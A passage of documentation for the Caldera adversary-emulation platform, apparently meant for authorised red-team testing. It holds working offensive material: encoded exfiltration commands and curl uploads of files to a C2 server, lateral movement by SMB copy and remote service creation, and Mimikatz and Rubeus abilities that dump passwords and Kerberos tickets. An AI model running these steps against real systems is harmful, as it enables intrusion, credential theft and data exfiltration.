            "exit_code": "0"
          },
          "pid": 57383,
          "platform": "darwin",
          "run": "2022-05-11T22:13:02Z",
          "status": 0
        },
        {
          "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
          "agent_reported_time": "2022-05-11T22:14:02Z",
          "attack": {
            "tactic": "exfiltration",
            "technique_id": "T1041",
            "technique_name": "Exfiltration Over C2 Channel"
          },
          "command": "Y3VybCAtRiAiZGF0YT1AL1VzZXJzL2NqZWxsZW4vc3RhZ2VkLnRhci5neiIgLS1oZWFkZXIgIlgtUmVxdWVzdC1JRDogYGhvc3RuYW1lYC12cmdpcngiIGh0dHA6Ly8wLjAuMC4wOjg4ODgvZmlsZS91cGxvYWQ=",
          "delegated": "2022-05-11T22:13:07Z",
          "description": "Exfil the staged directory",
          "executor": "sh",
          "link_id": "bda3e573-d751-420b-8740-d4a36cee1f9d",
          "name": "Exfil staged directory",
          "output": {
            "stdout": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100  1357    0     0  100  1357      0   441k --:--:-- --:--:-- --:--:--  441k",
            "stderr": "",
            "exit_code": "0"
          },
          "pid": 57568,
          "platform": "darwin",
          "run": "2022-05-11T22:14:02Z",
          "status": 0
        },
        {
          "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
          "agent_reported_time": "2022-05-11T22:15:01Z",
          "attack": {
            "tactic": "exfiltration",
            "technique_id": "T1560.001",
            "technique_name": "Archive Collected Data: Archive via Utility"
          },
          "command": "cm0gL1VzZXJzL2NqZWxsZW4vc3RhZ2VkLnRhci5neg==",
          "delegated": "2022-05-11T22:14:07Z",
          "description": "Compress a directory on the file system",
          "executor": "sh",
          "link_id": "e58dc3e6-b3a2-4657-aba0-f2f719a35041",
          "name": "Compress staged directory",
          "pid": 57769,
          "platform": "darwin",
          "run": "2022-05-11T22:15:01Z",
          "status": 0
        },
        {
          "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
          "agent_reported_time": "2022-05-11T22:15:03Z",
          "attack": {
            "tactic": "collection",
            "technique_id": "T1074.001",
            "technique_name": "Data Staged: Local Data Staging"
          },
          "command": "cm0gLXJmIHN0YWdlZA==",
          "delegated": "2022-05-11T22:14:07Z",
          "description": "create a directory for exfil staging",
          "executor": "sh",
          "link_id": "cdd17a43-2e06-4be4-b361-c3291cdb3f6a",
          "name": "Create staging directory",
          "pid": 57773,
          "platform": "darwin",
          "run": "2022-05-11T22:15:03Z",
          "status": 0
        }
      ]
    }
  }
}
```

## Operation Event Logs

The operation event logs JSON file can be downloaded via the `Download event logs` button on the operations modal after selecting an operation from the drop-down menu. To include command output, users should select the `include agent output` option. Operation event logs will also be automatically written to disk when an operation completes - see the section on [automatic event log generation](#automatic-event-log-generation).

The event logs JSON is a list of dictionary objects, where each dictionary represents an event that occurred during the operation (i.e. each link/command). Users can think of this as a "flattened" version of the operation steps displayed in the traditional report JSON format. However, not all of the operation or agent metadata from the operation report is included in the operation event logs. The event logs do not include operation facts, nor do they include operation links/commands that were skipped either manually or because certain requirements were not met (e.g. missing facts or insufficient privileges). The event log JSON format makes it more convenient to import into databases or SIEM tools.

The event dictionary has the following keys and values:
- `command`: base64-encoded command that was executed
- `delegated_timestamp`: Timestamp string in YYYY-MM-DD HH:MM:SS format that indicates when the operation made the link available for collection
- `collected_timestamp`: Timestamp in YYYY-MM-DD HH:MM:SS format that indicates when the agent collected the link available for collection
- `finished_timestamp`: Timestamp in YYYY-MM-DD HH:MM:SS format that indicates when the agent submitted the link execution results to the C2 server.
- `status`: link execution status
- `platform`: target platform for the agent running the link (e.g. "windows")
- `executor`: executor used to run the link command (e.g. "psh" for powershell)
- `pid`: process ID for the link
- `agent_metadata`: dictionary containing the following information for the agent that ran the link:
    - `paw`
    - `group`
    - `architecture`
    - `username`
    - `location`
    - `pid`
    - `ppid`
    - `privilege`
    - `host`
    - `contact`
    - `created`
- `ability_metadata`: dictionary containing the following information about the link ability:
    - `ability_id`
    - `ability_name`
    - `ability_description`
- `operation_metadata`: dictionary containing the following information about the operation that generated the link event:
    - `operation_name`
    - `operation_start`: operation start time in YYYY-MM-DD HH:MM:SS format
    - `operation_adversary`: name of the adversary used in the operation
- `attack_metadata`: dictionary containing the following ATT&CK information for the ability associated with the link:
    - `tactic`
    - `technique_id`
    - `technique_name`
- `output`: if the user selected `include agent output` when downloading the operation event logs, this field will contain a dictionary of the agent-provided output from running the link command.
    - `stdout`
    - `stderr`
    - `exit_code`
- `agent_reported_time`: Timestamp string representing the time at which the execution was ran by the agent in YYYY-MM-DD HH:MM:SS format. This field will not be present if the agent does not support reporting the command execution time.

Below is a sample output for operation event logs:

### Sample Event Logs

```json
[
  {
    "command": "R2V0LUNoaWxkSXRlbSBDOlxVc2VycyAtUmVjdXJzZSAtSW5jbHVkZSAqLnBuZyAtRXJyb3JBY3Rpb24gJ1NpbGVudGx5Q29udGludWUnIHwgZm9yZWFjaCB7JF8uRnVsbE5hbWV9IHwgU2VsZWN0LU9iamVjdCAtZmlyc3QgNTtleGl0IDA7",
    "delegated_timestamp": "2021-02-23T11:50:12Z",
    "collected_timestamp": "2021-02-23T11:50:14Z",
    "finished_timestamp": "2021-02-23T11:50:14Z",
    "status": 0,
    "platform": "windows",
    "executor": "psh",
    "pid": 7016,
    "agent_metadata": {
      "paw": "pertbn",
      "group": "red",
      "architecture": "amd64",
      "username": "BYZANTIUM\\Carlomagno",
      "location": "C:\\Users\\Public\\sandcat.exe",
      "pid": 5896,
      "ppid": 2624,
      "privilege": "Elevated",
      "host": "WORKSTATION1",
      "contact": "HTTP",
      "created": "2021-02-23T11:48:33Z"
    },
    "ability_metadata": {
      "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
      "ability_name": "Find files",
      "ability_description": "Locate files deemed sensitive"
    },
    "operation_metadata": {
      "operation_name": "My Operation",
      "operation_start": "2021-02-23T11:50:12Z",
      "operation_adversary": "Collection"
    },
    "attack_metadata": {
      "tactic": "collection",
      "technique_name": "Data from Local System",
      "technique_id": "T1005"
    },
    "agent_reported_time": "2021-02-23T11:50:13Z"
  },
  {
    "command": "R2V0LUNoaWxkSXRlbSBDOlxVc2VycyAtUmVjdXJzZSAtSW5jbHVkZSAqLnltbCAtRXJyb3JBY3Rpb24gJ1NpbGVudGx5Q29udGludWUnIHwgZm9yZWFjaCB7JF8uRnVsbE5hbWV9IHwgU2VsZWN0LU9iamVjdCAtZmlyc3QgNTtleGl0IDA7",
    "delegated_timestamp": "2021-02-23T11:50:17Z",
    "collected_timestamp": "2021-02-23T11:50:21Z",
    "finished_timestamp": "2021-02-23T11:50:21Z",
    "status": 0,
    "platform": "windows",
    "executor": "psh",
    "pid": 1048,
    "agent_metadata": {
      "paw": "pertbn",
      "group": "red",
      "architecture": "amd64",
      "username": "BYZANTIUM\\Carlomagno",
      "location": "C:\\Users\\Public\\sandcat.exe",
      "pid": 5896,
      "ppid": 2624,
      "privilege": "Elevated",
      "host": "WORKSTATION1",
      "contact": "HTTP",
      "created": "2021-02-23T11:48:33Z"
    },
    "ability_metadata": {
      "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
      "ability_name": "Find files",
      "ability_description": "Locate files deemed sensitive"
    },
    "operation_metadata": {
      "operation_name": "My Operation",
      "operation_start": "2021-02-23T11:50:12Z",
      "operation_adversary": "Collection"
    },
    "attack_metadata": {
      "tactic": "collection",
      "technique_name": "Data from Local System",
      "technique_id": "T1005"
    },
    "agent_reported_time": "2021-02-23T11:50:18Z"
  },
  {
    "command": "R2V0LUNoaWxkSXRlbSBDOlxVc2VycyAtUmVjdXJzZSAtSW5jbHVkZSAqLndhdiAtRXJyb3JBY3Rpb24gJ1NpbGVudGx5Q29udGludWUnIHwgZm9yZWFjaCB7JF8uRnVsbE5hbWV9IHwgU2VsZWN0LU9iamVjdCAtZmlyc3QgNTtleGl0IDA7",
    "delegated_timestamp": "2021-02-23T11:50:22Z",
    "collected_timestamp": "2021-02-23T11:50:27Z",
    "finished_timestamp": "2021-02-23T11:50:27Z",
    "status": 0,
    "platform": "windows",
    "executor": "psh",
    "pid": 5964,
    "agent_metadata": {
      "paw": "pertbn",
      "group": "red",
      "architecture": "amd64",
      "username": "BYZANTIUM\\Carlomagno",
      "location": "C:\\Users\\Public\\sandcat.exe",
      "pid": 5896,
      "ppid": 2624,
      "privilege": "Elevated",
      "host": "WORKSTATION1",
      "contact": "HTTP",
      "created": "2021-02-23T11:48:33Z"
    },
    "ability_metadata": {
      "ability_id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b",
      "ability_name": "Find files",
      "ability_description": "Locate files deemed sensitive"
    },
    "operation_metadata": {
      "operation_name": "My Operation",
      "operation_start": "2021-02-23T11:50:12Z",
      "operation_adversary": "Collection"
    },
    "attack_metadata": {
      "tactic": "collection",
      "technique_name": "Data from Local System",
      "technique_id": "T1005"
    },
    "agent_reported_time": "2021-02-23T11:50:25Z"
  },
  {
    "command": "TmV3LUl0ZW0gLVBhdGggIi4iIC1OYW1lICJzdGFnZWQiIC1JdGVtVHlwZSAiZGlyZWN0b3J5IiAtRm9yY2UgfCBmb3JlYWNoIHskXy5GdWxsTmFtZX0gfCBTZWxlY3QtT2JqZWN0",
    "delegated_timestamp": "2021-02-23T11:50:32Z",
    "collected_timestamp": "2021-02-23T11:50:37Z",
    "finished_timestamp": "2021-02-23T11:50:37Z",
    "status": 0,
    "platform": "windows",
    "executor": "psh",
    "pid": 3212,
    "agent_metadata": {
      "paw": "pertbn",
      "group": "red",
      "architecture": "amd64",
      "username": "BYZANTIUM\\Carlomagno",
      "location": "C:\\Users\\Public\\sandcat.exe",
      "pid": 5896,
      "ppid": 2624,
      "privilege": "Elevated",
      "host": "WORKSTATION1",
      "contact": "HTTP",
      "created": "2021-02-23T11:48:33Z"
    },
    "ability_metadata": {
      "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
      "ability_name": "Create staging directory",
      "ability_description": "create a directory for exfil staging"
    },
    "operation_metadata": {
      "operation_name": "My Operation",
      "operation_start": "2021-02-23T11:50:12Z",
      "operation_adversary": "Collection"
    },
    "attack_metadata": {
      "tactic": "collection",
      "technique_name": "Data Staged: Local Data Staging",
      "technique_id": "T1074.001"
    },
    "output": {
      "stdout": "C:\\Users\\carlomagno\\staged",
      "stderr": "",
      "exit_code": "0"
    },
    "agent_reported_time": "2021-02-23T11:50:33Z"
  },
  {
    "command": "UmVtb3ZlLUl0ZW0gLVBhdGggInN0YWdlZCIgLXJlY3Vyc2U=",
    "delegated_timestamp": "2021-02-23T11:50:42Z",
    "collected_timestamp": "2021-02-23T11:50:44Z",
    "finished_timestamp": "2021-02-23T11:50:44Z",
    "status": 0,
    "platform": "windows",
    "executor": "psh",
    "pid": 6184,
    "agent_metadata": {
      "paw": "pertbn",
      "group": "red",
      "architecture": "amd64",
      "username": "BYZANTIUM\\Carlomagno",
      "location": "C:\\Users\\Public\\sandcat.exe",
      "pid": 5896,
      "ppid": 2624,
      "privilege": "Elevated",
      "host": "WORKSTATION1",
      "contact": "HTTP",
      "created": "2021-02-23T11:48:33Z"
    },
    "ability_metadata": {
      "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
      "ability_name": "Create staging directory",
      "ability_description": "create a directory for exfil staging"
    },
    "operation_metadata": {
      "operation_name": "My Operation",
      "operation_start": "2021-02-23T11:50:12Z",
      "operation_adversary": "Collection"
    },
    "attack_metadata": {
      "tactic": "collection",
      "technique_name": "Data Staged: Local Data Staging",
      "technique_id": "T1074.001"
    },
    "agent_reported_time": "2021-02-23T11:50:43Z"
  }
]
```

### Automatic Event Log Generation

When an operation terminates, the corresponding event logs will be written to disk in the same format as if they were manually requested for download. These event logs will contain command output and will be unencrypted on disk. Each operation will have its own event logs written to a separate file in the directory `$reports_dir/event_logs`, where `$reports_dir` is the `reports_dir` entry in the Caldera configuration file. The filename will be of the format `operation_$id.json`, where `$id` is the unique ID of the operation.

# Initial Access Attacks

Caldera allows for easy initial access attacks, by leveraging the [Access](Plugin-library.md#access) plugin. This guide will walk you through how
to fire off an initial access attack, as well as how to build your own. 

## Run an initial access technique

Start by deploying an agent locally. This agent will be your "assistant". It will execute any attack you feed it. You
could alternatively deploy the agent remotely, which will help mask where your initial access attacks are originating.

From the Access plugin, select your agent and either the initial access tactic or any pre-ATT&CK tactic. This will
filter the abilities. Select any ability within your chosen tactic.

Once selected, a pop-up box will show you details about the ability. You'll need to fill in values for any properties
your selected ability requires. Click OK when done. 

Finally, click to run the ability against your selected agent. The ability will be in one of 3 states: IN-PROGRESS, 
SUCCESS or FAILED. If it is in either of the latter two states, you can view the logs from the executed ability by
clicking on the star.

## Write an initial access ability

You can easily add new initial access or pre-ATT&CK abilities yourself.

### Create a binary

You can use an existing binary or write your own - in any language - to act as your payload. The binary itself should
contain the code to execute your attack. It can be as simple or complex as you'd like. It should accept parameters 
for any dynamic behaviors. At minimum, you should require a parameter for "target", which would be your intended IP 
address, FQDN or other target that your attack will run against. 

As an example, look at the scanner.sh binary used for conducting a simple NMAP scan:
```
#!/bin/bash

echo '[+] Starting basic NMAP scan'
nmap -Pn $1
echo '[+] Complete with module'
```
This binary simply echos a few log statements and runs an NMAP scan against the first parameter (i.e., the target) passed to it. 

### Create an ability

With your binary at hand, you can now create a new ability YML file inside the Access plugin (plugins/access/data/abilities/*).
Select the correct tactic directory (or create one if one does not exist). Here is what the YML file looks like for 
the scanner.sh binary:
```
---
- id: 567eaaba-94cc-4a27-83f8-768e5638f4e1
  name: NMAP scan
  description: Scan an external host for open ports and services
  tactic: technical-information-gathering
  technique:
    name: Conduct active scanning
    attack_id: T1254
  platforms:
    darwin,linux:
      sh:
        command: |
          ./scanner.sh #{target.ip}
        timeout: 300
        payloads:
          - scanner.sh
```
This is the same format that is used for other Caldera abilities, so refer to the [Learning the terminology](Learning-the-terminology.md) page
for a run-through of all the fields. 

### Run the ability

With your ability YML file loaded, restart Caldera and head to the Access plugin to run it.

# Windows Lateral Movement Guide

Exercising Caldera's lateral movement and remote execution abilities allows you to test how easily an adversary can move
within your network. This guide will walk you through some of the necessary setup steps to get started with testing 
lateral movement in a Windows environment.

## Setup

### Firewall Exceptions and Enabling File and Printer Sharing

The firewall of the target host should not be blocking UDP ports 137 and 138 and TCP ports 139 and 445. The firewall
should also allow inbound file and printer sharing.

```
netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
```

### User with Administrative Privileges

This guide will assume a user *with administrative privileges to the target host* has been compromised and that a Caldera
agent has been spawned with this user's privileges. Some methods of lateral movement may depend on whether (1) the user 
has administrative privileges but is not a domain account or (2) the user has administrative privileges and is a domain 
account. The example walkthrough in this guide should not be impacted by these distinctions.

### Additional Considerations

1. Ensure GPO/SRP or antivirus is not blocking remote access to shares.
2. Ensure at least ADMIN$, C$, and IPC$ shares exist on the target host.

## Lateral Movement Using Caldera
Lateral movement can be a combination of two steps. The first requires confirmation of remote access to the next target 
host and the movement or upload of the remote access tool (RAT) executable to the host. The second part requires 
*execution* of the binary, which upon callback of the RAT on the new host would complete the lateral movement.

Most of Caldera's lateral movement and execution abilities found in Stockpile have fact or relationship requirements 
that must be satisfied. This information may be passed to the operation in two ways:
1. The fact and relationship information may be added to an operation's source. A new source can be created or this
information can be added to an already existing source as long as that source is used by the operation. When configuring
an operation, open the "**AUTONOMOUS**" drop down section and select "Use [insert source name] facts" to indicate to the 
operation that it should take in fact and relationship information from the selected source.
2. The fact and relationship information can be discovered by an operation. This requires additional abilities to be run
prior to the lateral movement and execution abilities to collect the necessary fact and relationship information 
necessary to satisfy the ability requirements.

### Moving the Binary
There are several ways a binary can be moved or uploaded from one host to another. Some example methods used in 
Caldera's lateral movement abilities include:
1. WinRM
2. SCP
3. wmic
4. SMB
5. psexec
 
Based on the tool used, additional permissions may need to be changed in order for users to conduct these actions 
remotely.

### Execution of the Binary
Caldera's Stockpile execution abilities relevant to lateral movement mainly use wmic to remotely start the binary. Some 
additional execution methods include modifications to Windows services and scheduled tasks. The example in this guide 
will use the creation of a service to remotely start the binary (ability file included at the end of this guide).

See ATT&CK's [Execution](https://attack.mitre.org/tactics/TA0002/) tactic page for more details on execution methods.

### Displaying Lateral Movement in Debrief
Using the adversary profile in this guide and Caldera's Debrief plugin, you can view the path an adversary took through 
the network via lateral movement attempts. In the Debrief modal, select the operation where lateral movement was 
attempted then select the Attack Path view from the upper right hand corner of graph views. This graph displays the 
originating C2 server and agent nodes connected by the execution command linking the originating agent to the newly
spawned agent.

In the example attack path graph below, the Service Creation Lateral Movement adversary profile was run on the `win10` 
host, which moved laterally to the `VAGRANTDC` machine via successful execution of the Service Creation ability.

![Debrief Attack Path Example](/img/debrief_attack_path.png)    

This capability relies on the `origin_link_id` field to be populated within the agent profile upon first
check-in and is currently implemented for the default agent, Sandcat. For more information about the `#{origin_link_id}`
global variable, see the explanation of **Command** in the [Abilities](Basic-Usage.md#abilities)
section of the Basic Usage guide. For more information about how lateral movement tracking is implemented 
in agents to be used with Caldera, see the [Lateral Movement Tracking](How-to-Build-Agents.md#lateral-movement-tracking) 
section of the How to Build Agents guide.


## Example Lateral Movement Profile
This section will walkthrough the necessary steps for proper execution of the Service Creation Lateral Movement
adversary profile. This section will assume successful setup from the previous sections mentioned in this guide and that
a Sandcat agent has been spawned with administrative privileges to the remote target host. The full ability files used 
in this adversary profile are included at the end of this guide.

1. Go to `navigate` pane > `Advanced` > `sources`. This should open a new sources modal in the web GUI.
2. Click the toggle to create a new source. Enter "SC Source" as the source name. Then enter `remote.host.fqdn` as the 
fact name and the FQDN of the target host you are looking to move laterally to as the fact value. Click `Save` once 
source configuration has been completed.
3. Go to `navigate` pane > `Campaigns` > `operations`. Click the toggle to create a new operation. Under 
`BASIC OPTIONS` select the group with the relevant agent and the Service Creation Lateral Movement profile. Under 
`AUTONOMOUS`, select `Use SC Source facts`. If the source created from the previous step is not available in the 
drop down, try refreshing the page. 
4. Once operation configurations have been completed, click `Start` to start the operation.
5. Check the agents list for a new agent on the target host.

### Ability Files Used
```
- id: deeac480-5c2a-42b5-90bb-41675ee53c7e
  name: View remote shares
  description: View the shares of a remote host
  tactic: discovery
  technique:
    attack_id: T1135
    name: Network Share Discovery
  platforms:
    windows:
      psh:
        command: net view \\#{remote.host.fqdn} /all
        parsers:
          plugins.stockpile.app.parsers.net_view:
          - source: remote.host.fqdn
            edge: has_share
            target: remote.host.share
      cmd:
        command: net view \\#{remote.host.fqdn} /all
        parsers:
          plugins.stockpile.app.parsers.net_view:
          - source: remote.host.fqdn
            edge: has_share
            target: remote.host.share
```

```
- id: 65048ec1-f7ca-49d3-9410-10813e472b30
  name: Copy Sandcat (SMB)
  description: Copy Sandcat to remote host (SMB)
  tactic: lateral-movement
  technique:
    attack_id: T1021.002
    name: "Remote Services: SMB/Windows Admin Shares"
  platforms:
    windows:
      psh:
        command: |
          $path = "sandcat.go-windows";
          $drive = "\\#{remote.host.fqdn}\C$";
          Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
        cleanup: |
          $drive = "\\#{remote.host.fqdn}\C$";
          Remove-Item -Path $drive"\Users\Public\s4ndc4t.exe" -Force;
        parsers:
          plugins.stockpile.app.parsers.54ndc47_remote_copy:
          - source: remote.host.fqdn
            edge: has_54ndc47_copy
        payloads:
        - sandcat.go-windows
  requirements:
  - plugins.stockpile.app.requirements.not_exists:
    - source: remote.host.fqdn
      edge: has_54ndc47_copy
  - plugins.stockpile.app.requirements.basic:
    - source: remote.host.fqdn
      edge: has_share
  - plugins.stockpile.app.requirements.no_backwards_movement:
    - source: remote.host.fqdn
```

```
- id: 95727b87-175c-4a69-8c7a-a5d82746a753
  name: Service Creation
  description: Create a service named "sandsvc" to execute remote Sandcat binary named "s4ndc4t.exe"
  tactic: execution
  technique:
    attack_id: T1569.002
    name: 'System Services: Service Execution'
  platforms:
    windows:
      psh:
        timeout: 300
        cleanup: |
          sc.exe \\#{remote.host.fqdn} stop sandsvc;
          sc.exe \\#{remote.host.fqdn} delete sandsvc /f;
          taskkill /s \\#{remote.host.fqdn} /FI "Imagename eq s4ndc4t.exe"
        command: |
          sc.exe \\#{remote.host.fqdn} create sandsvc start= demand error= ignore binpath= "cmd /c start C:\Users\Public\s4ndc4t.exe -server #{server} -v -originLinkID #{origin_link_id}" displayname= "Sandcat Execution";
          sc.exe \\#{remote.host.fqdn} start sandsvc;
          Start-Sleep -s 15;
          Get-Process -ComputerName #{remote.host.fqdn} s4ndc4t;
```

# Dynamically-Compiled Payloads

The [Builder](Plugin-library.md#builder) plugin can be used to create dynamically-compiled payloads. Currently, the plugin supports C#, C, C++, and Golang.

Code is compiled in a Docker container. The resulting executable, along with any additional references, will be copied to the remote machine and executed.

Details for the available languages are below:

- `csharp`: Compile C# executable using Mono
- `cpp_windows_x64`: Compile 64-bit Windows C++ executable using MXE/MinGW-w64
- `cpp_windows_x86`: Compile 64-bit Windows C++ executable using MXE/MinGW-w64
- `c_windows_x64`: Compile 64-bit Windows C executable using MXE/MinGW-w64
- `c_windows_x86`: Compile 64-bit Windows C executable using MXE/MinGW-w64
- `go_windows`: Build Golang executable for Windows

### Basic Example

The following "Hello World" ability can be used as a template for C# ability development:

```yaml
---

- id: 096a4e60-e761-4c16-891a-3dc4eff02e74
  name: Test C# Hello World
  description: Dynamically compile HelloWorld.exe
  tactic: execution
  technique:
    attack_id: T1059
    name: Command-Line Interface
  platforms:
    windows:
      psh,cmd:
        build_target: HelloWorld.exe
        language: csharp
        code: |
          using System;

          namespace HelloWorld
          {
              class Program
              {
                  static void Main(string[] args)
                  {
                      Console.WriteLine("Hello World!");
                  }
              }
          }
```

It is possible to reference a source code file as well. The source code file should be in the plugin's `payloads/` directory. This is shown in the example below:

```yaml
---

- id: 096a4e60-e761-4c16-891a-3dc4eff02e74
  name: Test C# Hello World
  description: Dynamically compile HelloWorld.exe
  tactic: execution
  technique:
    attack_id: T1059
    name: Command-Line Interface
  platforms:
    windows:
      psh,cmd:
        build_target: HelloWorld.exe
        language: csharp
        code: HelloWorld.cs
```

### Advanced Examples

#### Arguments

It is possible to call dynamically-compiled executables with command line arguments by setting the ability `command` value. This allows for the passing of facts into the ability. The following example demonstrates this:

```yaml
---

- id: ac6106b3-4a45-4b5f-bebf-0bef13ba7c81
  name: Test C# Code with Arguments
  description: Hello Name
  tactic: execution
  technique:
    attack_id: T1059
    name: Command-Line Interface
  platforms:
    windows:
      psh,cmd:
        build_target: HelloName.exe
        command: .\HelloName.exe "#{paw}"
        language: csharp
        code: |
          using System;

          namespace HelloWorld
          {
              class Program
              {
                  static void Main(string[] args)
                  {
                      if (args.Length == 0) {
                          Console.WriteLine("No name provided");
                      }
                      else {
                        Console.WriteLine("Hello " + Convert.ToString(args[0]));
                      }
                  }
              }
          }
```

#### DLL Dependencies

DLL dependencies can be added, at both compilation and execution times, using the ability `payload` field. The referenced library should be in a plugin's `payloads` folder, the same as any other payload.

The following ability references `SharpSploit.dll` and dumps logon passwords using Mimikatz:

```yaml
---

- id: 16bc2258-3b67-46c1-afb3-5269b6171c7e
  name: SharpSploit Mimikatz (DLL Dependency)
  description: SharpSploit Mimikatz
  tactic: credential-access
  technique:
    attack_id: T1003
    name: Credential Dumping
  privilege: Elevated
  platforms:
    windows:
      psh,cmd:
        build_target: CredDump.exe
        language: csharp
        code: |
          using System;
          using System.IO;
          using SharpSploit;

          namespace CredDump
          {
              class Program
              {
                  static void Main(string[] args)
                  {
                      SharpSploit.Credentials.Mimikatz mimi = new SharpSploit.Credentials.Mimikatz();
                      string logonPasswords = SharpSploit.Credentials.Mimikatz.LogonPasswords();
                      Console.WriteLine(logonPasswords);
                  }
              }
          }
        parsers:
          plugins.stockpile.app.parsers.katz:
            - source: domain.user.name
              edge: has_password
              target: domain.user.password
            - source: domain.user.name
              edge: has_hash
              target: domain.user.ntlm
            - source: domain.user.name
              edge: has_hash
              target: domain.user.sha1
  payloads:
    - SharpSploit.dll
```

#### Donut

The `donut` gocat extension is required to execute donut shellcode.

The `donut_amd64` executor combined with a `build_target` value ending with `.donut`, can be used to generate shellcode using [donut](https://github.com/TheWover/donut). Payloads will first be dynamically-compiled into .NET executables using Builder, then converted to donut shellcode by a Stockpile payload handler. The `.donut` file is downloaded to memory and injected into a new process by the sandcat agent.

The `command` field can, optionally, be used to supply command line arguments to the payload. In order for the sandcat agent to properly execute the payload, the `command` field must either begin with the `.donut` file name, or not exist.

The following example shows donut functionality using the optional `command` field to pass arguments:

```yaml
---

- id: 7edeece0-9a0e-4fdc-a93d-86fe2ff8ad55
  name: Test Donut with Arguments
  description: Hello Name Donut
  tactic: execution
  technique:
    attack_id: T1059
    name: Command-Line Interface
  platforms:
    windows:
      donut_amd64:
        build_target: HelloNameDonut.donut
        command: .\HelloNameDonut.donut "#{paw}" "#{server}"
        language: csharp
        code: |
          using System;

          namespace HelloNameDonut
          {
              class Program
              {
                  static void Main(string[] args)
                  {
                      if (args.Length < 2) {
                          Console.WriteLine("No name, no server");
                      }
                      else {
                        Console.WriteLine("Hello " + Convert.ToString(args[0]) + " from " + Convert.ToString(args[1]));
                      }
                  }
              }
          }
```

Donut can also be used to read from pre-compiled executables. .NET Framework 4 is required. Executables will be found with either a `.donut.exe` or a `.exe` extension, and `.donut.exe` extensions will be prioritized. The following example will transform a payload named `Rubeus.donut.exe` into shellcode which will be executed in memory. Note that `Rubeus.donut` is specified in the payload and command:

```yaml
---

- id: 043d6200-0541-41ee-bc7f-bcc6ba15facd
  name: TGT Dump
  description: Dump TGT tickets with Rubeus
  tactic: credential-access
  technique:
    attack_id: T1558
    name: Steal or Forge Kerberos Tickets
  privilege: Elevated
  platforms:
    windows:
      donut_amd64:
        command: .\Rubeus.donut dump /nowrap
        payloads:
        - Rubeus.donut
```

# Exfiltration

After completing an operation a user may want to review the data retrieved from the target system. This data is automatically stored on the Caldera server in a directory specified in [/conf/default.yml](Server-Configuration.md#configuration-file).

## Exfiltrating Files

Some abilities will transfer files from the agent to the Caldera server. This can be done manually with 
```yaml
curl -X POST -F 'data=@/file/path/' http://server_ip:8888/file/upload
```
Note: localhost could be rejected in place of the server IP. In this case you will get error 7. You should type out the full IP.
These files are sent from the agent to server_ip/file/upload at which point the server places these files inside the directory specified by [/conf/default.yml to key "exfil_dir"](Server-Configuration.md#configuration-file). By default it is set to `/tmp/caldera`.

## Accessing Exfiltrated Files

The server stores all exfiltrated files inside the directory specified by [/conf/default.yml to key "exfil_dir"](Server-Configuration.md#configuration-file). By default it is set to `/tmp/caldera`.

Files can be accessed by pulling them directly from that location when on the server and manually unencrypting the files.

To simplify accessing exfiltrated files from a running caldera server, you can go the the advanced section in the Caldera UI and click on the 'exfilled files' section.

From there you can select an operation (or all) from the drop down to see a listing of all the files in the exfil folder corresponding to the operation (specifically works with sandcat agents or any other agent using the same naming scheme for file upload folder) or in the directory along with the option to select any number of files to download directly to your machine.

All downloaded files will be unencrypted before passing along as a download.

## Accessing Operations Reports

After the server is shut down the reports from operations are placed inside the directory specified by the [/conf/default.yml to key "reports_dir"](Server-Configuration.md#configuration-file). By default it is also set to `/tmp`.


## Unencrypting the files
The reports and exfiltrated files are encrypted on the server. To view the file contents the user will have to decrypt the file using /app/utility/file_decryptor.py . This can be performed with:

```shell
python /app/utility/file_decryptor.py --config /conf/default.yml _input file path_
```

The output file will already have the _decrypted tag appended to the end of the file name once the decrypted file is created by the python script.

# Peer-to-Peer Proxy Functionality for Sandcat Agents

In certain scenarios, an agent may start on a machine that can't directly connect to the C2 server. 
For instance, agent A may laterally move to a machine that is on an internal network and cannot beacon out to the C2.
By giving agents peer-to-peer capabilities, users can overcome these limitations. Peer-to-peer proxy-enabled agents
can relay messages and act as proxies between the C2 server and peers, giving users more flexibility in their
Caldera operations.

This guide will explain how Sandcat incorporates peer-to-peer proxy functionality and how users can include it
in their operations.

## How Sandcat Uses Peer-to-Peer

By default, a Sandcat agent will try to connect to its defined C2 server using the provided C2 protocol 
(e.g. HTTP). Under ideal circumstances, the requested C2 server is valid and reachable by the agent, and no issues
occur. Because agents cannot guarantee that the requested C2 server is valid, that the requested C2 protocol is
valid and supported by the agent, nor that the C2 server is even reachable, the agent will fall back to
peer-to-peer proxy methods as a backup method. The order of events is as follows:
1. Agent checks if the provided C2 protocol is valid and supported. If not, the agent resorts to peer-to-peer proxy.
2. If the C2 protocol is valid and supported, the agent will try to reach out to the provided C2 server using
that protocol. If the agent gets a successful Beacon, then it continues using the established C2 protocol and server.
If the agent misses 3 Beacons in a row (even after having successfully Beaconed in the past), 
then the agent will fall back to peer-to-peer proxy.

When falling back to peer-to-peer proxy methods, the agent does the following:
1. Search through all known peer proxy receivers and see if any of their protocols are supported.
2. If the agent finds a peer proxy protocol it can use, it will switch its C2 server and C2 protocol to one of
the available corresponding peer proxy locations and the associated peer proxy protocol. 
For example, if an agent cannot successfully make HTTP requests to
the C2 server at `http://10.1.1.1:8080`, but it knows that another agent is proxying peer communications through
an SMB pipe path available at `\\WORKSTATION\pipe\proxypipe`, then the agent will check if it supports SMB Pipe
peer-to-peer proxy capabilities. If so (i.e. if the associated gocat extension was included in the Sandcat binary),
then the agent will change its server to `\\WORKSTATION\pipe\proxypipe` and its C2 protocol to `SmbPipe`.

The agent also keeps track of which peer proxy receivers it has tried so far, and it will round-robin through each
one it hasn't tried until it finds one it can use. If the agent cannot use any of the available peer proxy receivers,
or if they happen to all be offline or unreachable, then the agent will pause and try each one again.

### Determining Available Receivers

Since an agent that requires peer-to-peer communication can't reach the C2 server, it needs a way to obtain the
available proxy peer receivers (their protocols and where to find them). Currently, Caldera achieves this by
